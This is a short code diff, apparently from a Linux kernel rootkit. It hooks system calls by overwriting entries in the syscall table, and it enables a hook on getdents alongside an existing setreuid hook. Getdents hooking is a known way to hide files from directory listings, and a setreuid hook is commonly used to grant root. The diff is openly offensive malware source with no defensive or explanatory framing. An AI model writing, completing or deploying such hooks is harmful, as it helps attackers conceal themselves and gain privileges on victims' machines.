@@ -134,8 +134,8 @@ void init_hooks(void)
     sys_setreuid = (void *)sct[__NR_setreuid];
     hook_start(sys_setreuid, &n_sys_setreuid);
 
-    //sys_getdents = (void *)sct[__NR_getdents];
-    //hook_start(sys_getdents, &n_sys_getdents);
+    sys_getdents = (void *)sct[__NR_getdents];
+    hook_start(sys_getdents, &n_sys_getdents);
 
     //sys_getdents64 = (void *)sct[__NR_getdents64];
     //hook_start(sys_getdents64, &n_sys_getdents64);
@@ -146,6 +146,6 @@ void exit_hooks(void)
     DEBUG("Unhooking syscalls\n");
 
     hook_stop(sys_setreuid);
-    //hook_stop(sys_getdents);
+    hook_stop(sys_getdents);
     //hook_stop(sys_getdents64);
 }
